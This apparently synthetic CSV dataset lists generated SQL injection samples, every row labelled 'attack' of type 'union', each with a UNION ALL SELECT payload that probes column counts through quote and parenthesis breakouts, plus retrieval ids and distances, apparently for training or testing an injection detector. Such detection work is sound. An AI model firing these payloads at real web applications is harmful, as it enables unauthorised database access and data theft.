id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000094,attack,union,"-2790%""  )   union all select 5070,5070#",nearest_attack_euclidean,R000236,4.905516684011188
CTGAN_000095,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.386000938418872
CTGAN_000096,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,6.098089994715985
CTGAN_000097,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000069,7.488406698899384
CTGAN_000098,attack,union,"1%""  )   union all select null,null#",nearest_attack_euclidean,R000135,6.297875865569608
CTGAN_000099,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000211,5.330348220363723
CTGAN_000100,attack,union,"-3349   )    )     )   union all select 6553,6553#",nearest_attack_euclidean,R000011,6.780999995396779
CTGAN_000101,attack,union,"-2009%' union all select 1991,1991#",nearest_attack_euclidean,R000074,7.087138052372259
CTGAN_000102,attack,union,"1%' union all select null,null,null--",nearest_attack_euclidean,R000131,5.897108824837229
CTGAN_000103,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R000144,5.783158389748322
CTGAN_000104,attack,union,"1' union all select null,null--",nearest_attack_euclidean,R000292,4.795831452819693
CTGAN_000105,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.83861986214067
CTGAN_000106,attack,union,"1%""  )   union all select null,null,null,null#",nearest_attack_euclidean,R000033,5.063360399994629
CTGAN_000107,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,6.3388446530682945
CTGAN_000108,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R000288,5.641137453463314
CTGAN_000109,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,7.278614164956794
CTGAN_000110,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000188,6.799358539436351
CTGAN_000111,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,4.45591184141289
CTGAN_000112,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000069,6.419831220629632
CTGAN_000113,attack,union,-3752%' union all select 9351--,nearest_attack_euclidean,R000199,5.962608318213013
CTGAN_000114,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000188,7.157813575205824
CTGAN_000115,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000209,4.151729759476897
CTGAN_000116,attack,union,"-1204'   )    )    union all select 3585,3585--",nearest_attack_euclidean,R000307,5.750947717898101
CTGAN_000117,attack,union,"-3445 union all select 5505,5505,5505--",nearest_attack_euclidean,R000087,6.662139487431335
CTGAN_000118,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,7.654111980731361
CTGAN_000119,attack,union,"1%'  )   union all select null,null#",nearest_attack_euclidean,R000203,6.635048489767501
CTGAN_000120,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,7.087448064887949
CTGAN_000121,attack,union,"-4031%"" union all select 9566--",nearest_attack_euclidean,R000023,6.664220672727699
CTGAN_000122,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000016,5.8028463694409265
CTGAN_000123,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000010,6.507956467366837
CTGAN_000124,attack,union,"-2046'  )   union all select 6668,6668--",nearest_attack_euclidean,R000170,7.591235098720794
CTGAN_000125,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,6.871878973018413
CTGAN_000126,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,7.737297680469543
CTGAN_000127,attack,union,"-5826""   )    )    union all select 7192,7192#",nearest_attack_euclidean,R000160,5.866302979243294
CTGAN_000128,attack,union,"1%'  )   union all select null,null,null#",nearest_attack_euclidean,R000156,6.442541639044982
CTGAN_000129,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R000245,6.799518970086342
CTGAN_000130,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,7.29094054559741
CTGAN_000131,attack,union,"-6214"" union all select 3323,3323#",nearest_attack_euclidean,R000059,5.674671850659242
CTGAN_000132,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,5.4320041848722775
CTGAN_000133,attack,union,"-1015""   )    )    union all select 6624,6624#",nearest_attack_euclidean,R000148,7.906141978863337
CTGAN_000134,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000111,6.552034298707729
CTGAN_000135,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,5.950756225018537
CTGAN_000136,attack,union,"1"" union all select null,null--",nearest_attack_euclidean,R000089,7.362408448323982
CTGAN_000137,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,6.0445567831130615
CTGAN_000138,attack,union,"-7868"" union all select 1805--",nearest_attack_euclidean,R000173,4.4706472966247155
CTGAN_000139,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R000291,6.670729244979526
CTGAN_000140,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000099,9.504584541222526
CTGAN_000141,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R000288,5.809186636230288
CTGAN_000142,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,7.264521731890751
CTGAN_000143,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000188,6.261261014739774
CTGAN_000144,attack,union,-9841 where 4612  =  4612 union all select 4612--,nearest_attack_euclidean,R000138,10.37865326249465
CTGAN_000145,attack,union,"1"" union all select null,null--",nearest_attack_euclidean,R000089,6.178960539859352
CTGAN_000146,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,5.436122720529965
CTGAN_000147,attack,union,"-9361""   )    )    union all select 3112#",nearest_attack_euclidean,R000257,4.212595679078216
CTGAN_000148,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000010,6.096129938515457
CTGAN_000149,attack,union,"-2140   )    )    union all select 8174,8174,8174#",nearest_attack_euclidean,R000083,5.102263257178436
CTGAN_000150,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R000091,6.673937560807513
CTGAN_000151,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000209,6.025939720285941
CTGAN_000152,attack,union,1' where 8159  =  8159 union all select null#,nearest_attack_euclidean,R000177,8.03728647985995
CTGAN_000153,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R000291,5.502247558473752
CTGAN_000154,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000209,7.605864628151627
CTGAN_000155,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,5.6788553522711585
CTGAN_000156,attack,union,-6567'   )    )    union all select 3217#,nearest_attack_euclidean,R000169,5.499483701534632
CTGAN_000157,attack,union,"1'  )   union all select null,null,null,null--",nearest_attack_euclidean,R000057,7.104859656856698
CTGAN_000158,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000158,5.936471858043458
CTGAN_000159,attack,union,"1  )   union all select null,null,null,null#",nearest_attack_euclidean,R000063,7.072015028261755
CTGAN_000160,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,8.055188257285568
CTGAN_000161,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,4.097378150227443
CTGAN_000162,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,6.57411774417206
CTGAN_000163,attack,union,"-5496 union all select 2099,2099,2099#",nearest_attack_euclidean,R000215,5.479141794825479
CTGAN_000164,attack,union,-4171'  )   union all select 6136#,nearest_attack_euclidean,R000262,4.388279663790539
CTGAN_000165,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R000091,6.588909108848471
CTGAN_000166,attack,union,"-9509  )   union all select 1193,1193,1193#",nearest_attack_euclidean,R000096,5.006496263200445
CTGAN_000167,attack,union,"-2009%' union all select 1991,1991#",nearest_attack_euclidean,R000074,6.3186872532844784
CTGAN_000168,attack,union,-1304'  )   union all select 7639#,nearest_attack_euclidean,R000065,8.226037326002155
CTGAN_000169,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R000103,5.203653816651335
CTGAN_000170,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R000227,5.867390909670772
CTGAN_000171,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,5.940682972283175
CTGAN_000172,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.395992277635845
CTGAN_000173,attack,union,"1""  )   union all select null#",nearest_attack_euclidean,R000015,5.928616126879908
CTGAN_000174,attack,union,"1%'   )    )    union all select null,null,null#",nearest_attack_euclidean,R000129,7.439060278253035
CTGAN_000175,attack,union,"-8124  )   union all select 7251,7251,7251#",nearest_attack_euclidean,R000221,6.909569169438768
CTGAN_000176,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,7.104279827744614
CTGAN_000177,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,4.7690513880218175
CTGAN_000178,attack,union,"1%'  )   union all select null,null--",nearest_attack_euclidean,R000115,5.168825539265282
CTGAN_000179,attack,union,"-5826""   )    )    union all select 7192,7192#",nearest_attack_euclidean,R000160,6.975944554218056
CTGAN_000180,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,5.249481339809031
CTGAN_000181,attack,union,"-8943%'  )   union all select 7710,7710#",nearest_attack_euclidean,R000078,6.228378494034456
CTGAN_000182,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000003,5.15298658147671
CTGAN_000183,attack,union,"-1630' union all select 1971,1971--",nearest_attack_euclidean,R000263,5.593605306641569
CTGAN_000184,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000016,7.678761961957606
CTGAN_000185,attack,union,"-2009%' union all select 1991,1991#",nearest_attack_euclidean,R000074,6.160411959640746
CTGAN_000186,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R000159,5.594147059908568
CTGAN_000187,attack,union,-3988'   )    )    union all select 1113#,nearest_attack_euclidean,R000185,6.056657837799577
CTGAN_000188,attack,union,"-7661"" union all select 9551,9551,9551#",nearest_attack_euclidean,R000251,7.93858031114081
CTGAN_000189,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,9.0032927233775
CTGAN_000190,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,6.060224895818973
CTGAN_000191,attack,union,"-5691' union all select 6610,6610#",nearest_attack_euclidean,R000149,7.835725842935318
CTGAN_000192,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000209,7.98172568254505
CTGAN_000193,attack,union,"-2009%' union all select 1991,1991#",nearest_attack_euclidean,R000074,6.1052801526481995
CTGAN_000194,attack,union,"-2009%' union all select 1991,1991#",nearest_attack_euclidean,R000074,5.098850358321858
CTGAN_000195,attack,union,"-6600'  )   union all select 5566,5566#",nearest_attack_euclidean,R000157,5.707047821172492
CTGAN_000196,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000034,5.562560136903906
CTGAN_000197,attack,union,-8513' union all select 7414--,nearest_attack_euclidean,R000022,5.190392625447507
CTGAN_000198,attack,union,"-4927'   )    )    union all select 1924,1924#",nearest_attack_euclidean,R000050,6.6328193961854955
CTGAN_000199,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,8.500924679920734
CTGAN_000200,attack,union,"-8414%""  )   union all select 2795#",nearest_attack_euclidean,R000192,5.345898978283751
